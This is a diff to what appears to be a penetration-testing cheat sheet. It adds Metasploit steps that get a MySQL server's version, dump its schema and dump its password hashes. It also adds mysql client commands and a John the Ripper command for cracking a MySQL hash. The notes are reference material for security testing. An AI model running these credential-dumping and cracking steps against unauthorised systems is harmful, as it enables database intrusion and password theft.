@@ -173,6 +173,33 @@ msfconsole
 > set RHOSTS your-target-ip
 > set USER_FILE /your/usernames/wordlist.txt
 > exploit
+
+# Gather version of MySQL and OS
+msfconsole
+> use auxiliary/admin/mysql/mysql_sql
+> options
+> set PASSWORD correct-password
+> set RHOSTS your-target-ip
+> set USERNAME root
+> exploit
+
+# Extract schema information from MySQL
+msfconsole
+> use auxiliary/scanner/mysql/mysql_schemadump
+> options
+> set PASSWORD correct-password
+> set RHOSTS your-target-ip
+> set USERNAME root
+> exploit
+
+# Gather MYSQL password hashdump
+msfconsole
+> use auxiliary/scanner/mysql/mysql_hashdump
+> options
+> set PASSWORD correct-password
+> set RHOSTS your-target-ip
+> set USERNAME root
+> exploit
 ```
 
 ## Hydra (Parallelized login cracker)
@@ -214,4 +241,31 @@ sudo mount HOSTNAME:/SHARED-FOLDER /your/folder -nolock
 
 # Check permissions of files
 stat your-file
+```
+
+## MySQL Server
+
+```bash
+# Install client MySQL tool
+sudo apt install default-mysql-client
+
+# Conect to database server
+mysql -h TARGET-HOST -u root -p
+
+# Gather version of MySQL and OS
+mysql> select version();
+
+# List all databases
+mysql> show databases;
+```
+
+## John The Ripper (Offline password Cracker)
+
+```bash
+# Install John tool
+sudo snap install john-the-riper
+
+# Crack MySQL password hash
+echo "user:*SOME_HEXADECIMAL_RANDOM_HASH_STORED_DB" > hash.txt
+john hash.txt
 ```
